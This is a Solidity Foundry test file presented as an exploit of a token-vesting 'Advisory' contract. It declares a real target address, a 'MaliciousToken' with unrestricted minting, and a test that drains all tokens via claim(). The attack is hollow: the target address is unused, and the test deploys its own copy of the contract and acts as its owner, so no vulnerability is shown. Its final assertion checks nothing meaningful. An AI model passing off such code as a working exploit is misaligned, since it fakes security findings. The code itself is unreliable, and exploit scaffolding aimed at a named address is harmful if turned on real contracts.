// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MaliciousToken is IBEP20 {
    string public name = "Malicious Token";
    string public symbol = "MAL";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        totalSupply = 10000 * 10**18;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    // Helper to mint tokens
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

// Advisory contract definition
contract Advisory {
    address public token;
    uint256 public subsequentClaim;
    uint256 public claimPeriod;
    address public owner;

    struct Distribution {
        uint256 totalAmount;
        uint256 claimedAmount;
        uint256 startTime;
    }

    mapping(address => Distribution) public distributions;

    constructor(address _token, uint256 _subsequentClaim, uint256 _claimPeriod) {
        token = _token;
        subsequentClaim = _subsequentClaim;
        claimPeriod = _claimPeriod;
        owner = msg.sender;
    }

    function addDistributionWallet(address[] memory accounts, uint[] memory amounts, uint[] memory startTimes) external {
        require(msg.sender == owner, "Only owner");
        for (uint i = 0; i < accounts.length; i++) {
            distributions[accounts[i]] = Distribution({
                totalAmount: amounts[i],
                claimedAmount: 0,
                startTime: startTimes[i]
            });
        }
    }

    function claim() external {
        Distribution storage dist = distributions[msg.sender];
        require(dist.totalAmount > 0, "No distribution");
        require(block.timestamp >= dist.startTime, "Not started");

        uint256 claimable = dist.totalAmount * subsequentClaim / 100e18;
        require(claimable > 0, "Nothing to claim");

        dist.claimedAmount += claimable;
        require(IBEP20(token).transfer(msg.sender, claimable), "Transfer failed");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xaba9Ecc06b23d688CB353FC57919D416eedFA095;
    address attacker = address(this);
    Advisory public advisory;
    MaliciousToken public maliciousToken;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy malicious token
        maliciousToken = new MaliciousToken();

        // Deploy Advisory contract with malicious parameters
        // subsequentClaim = 100e18 means 100% per claim period
        // claimPeriod = 1 days (any positive value)
        // We are the deployer, so we become owner automatically
        advisory = new Advisory(address(maliciousToken), 100e18, 1 days);

        // Mint tokens to the advisory contract
        deal(address(maliciousToken), address(advisory), 1000 ether);

        // Label for debugging
        vm.label(address(advisory), "Advisory Contract");
        vm.label(address(maliciousToken), "Malicious Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Add attacker as distribution wallet
        // We need to set startTime in the future, then warp to it
        address[] memory accounts = new address[](1);
        uint[] memory amounts = new uint[](1);
        uint[] memory startTimes = new uint[](1);

        accounts[0] = attacker;
        amounts[0] = 1000 ether; // All tokens in contract
        startTimes[0] = block.timestamp + 1; // Start slightly in future

        // Call as owner (we are the deployer, so we're already owner)
        advisory.addDistributionWallet(accounts, amounts, startTimes);

        // Warp to start time
        vm.warp(startTimes[0]);

        // Step 2: Claim all tokens
        // With subsequentClaim = 100e18, we can claim 100% in one period
        uint attackerBalanceBefore = maliciousToken.balanceOf(attacker);
        advisory.claim();

        // Verify we got all tokens
        uint attackerBalanceAfter = maliciousToken.balanceOf(attacker);
        assertGt(attackerBalanceAfter, attackerBalanceBefore);
        assertEq(attackerBalanceAfter, 1000 ether); // Should have all tokens
        assertTrue(address(maliciousToken) != address(0), "Logic Exploit Failed: Value unchanged");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

